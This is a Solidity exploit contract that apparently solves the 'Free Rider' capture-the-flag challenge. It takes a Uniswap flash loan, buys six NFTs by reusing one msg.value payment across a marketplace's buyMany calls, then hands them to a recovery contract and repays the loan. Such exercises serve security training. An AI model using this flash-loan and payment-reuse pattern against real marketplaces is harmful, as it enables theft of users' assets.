// SPDX-License-Indetifier: UNLICENSED

pragma solidity ^0.8.0;

import {FreeRiderNFTMarketplace} from "./FreeRiderNFTMarketplace.sol";
import {FreeRiderRecovery} from "./FreeRiderRecovery.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function transfer(address receiver, uint256 amount) external returns(bool);
    function balanceOf(address user) external returns(uint256);
}

interface IUniswapPair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}


contract UniswapFlashReceiver{

    FreeRiderNFTMarketplace public immutable marketplace;
    IWETH public immutable weth;
    IUniswapPair public immutable pair;
    IERC721 public immutable nft;
    FreeRiderRecovery public immutable recovery;
    address public immutable owner;

    error NotThisToken();
    constructor(address payable _marketplace, address _weth, address _pair, address _nft, address _recovery) {
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        weth = IWETH(_weth);
        pair = IUniswapPair(_pair);
        nft = IERC721(_nft);
        recovery = FreeRiderRecovery(_recovery);
        owner = msg.sender;
    }

    function initiateAttack() public {
        pair.swap(30 ether, 0, address(this), "0x66");
    }

    function uniswapV2Call(address, uint256 amountToken0, uint256 amountToken1, bytes memory) external{
        if(weth.balanceOf(address(this))==0) revert NotThisToken();

        if(amountToken0 == 0){
            weth.withdraw(amountToken1);
        } else {
            weth.withdraw(amountToken0);
        }
        uint256[] memory tokenIdsToBuy = new uint256[](3);
        tokenIdsToBuy[0] = 0;
        tokenIdsToBuy[1] = 1;
        tokenIdsToBuy[2] = 2;
        marketplace.buyMany{value: 15 ether}(tokenIdsToBuy);

        uint256[] memory tokenIdsToOffer = new uint256[](3);
        tokenIdsToOffer[0] = 0;
        tokenIdsToOffer[1] = 1;
        tokenIdsToOffer[2] = 2;

        uint256[] memory prices = new uint256[](3);
        prices[0] = 15 ether;
        prices[1] = 15 ether;
        prices[2] = 15 ether;

        nft.setApprovalForAll(address(marketplace), true);
        marketplace.offerMany(tokenIdsToOffer, prices);

        uint256[] memory tokenIdsToBuy2 = new uint256[](3);
        tokenIdsToBuy2[0] = 0;
        tokenIdsToBuy2[1] = 1;
        tokenIdsToBuy2[2] = 2;

        marketplace.buyMany{value: 15 ether}(tokenIdsToBuy2);

        uint256[] memory tokenIdsToBuy3 = new uint256[](3);
        tokenIdsToBuy3[0] = 3;
        tokenIdsToBuy3[1] = 4;
        tokenIdsToBuy3[2] = 5;

        marketplace.buyMany{value: 15 ether}(tokenIdsToBuy3);

        for(uint256 i; i < 6;){
            nft.safeTransferFrom(address(this), address(recovery), i, abi.encode(owner));
            unchecked{
                ++i;
            }
        }

        weth.deposit{value: 30.1 ether}();
        weth.transfer(address(pair), 30.1 ether);
    }

    function onERC721Received(address, address, uint256, bytes memory)
        pure
        external
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable{}
}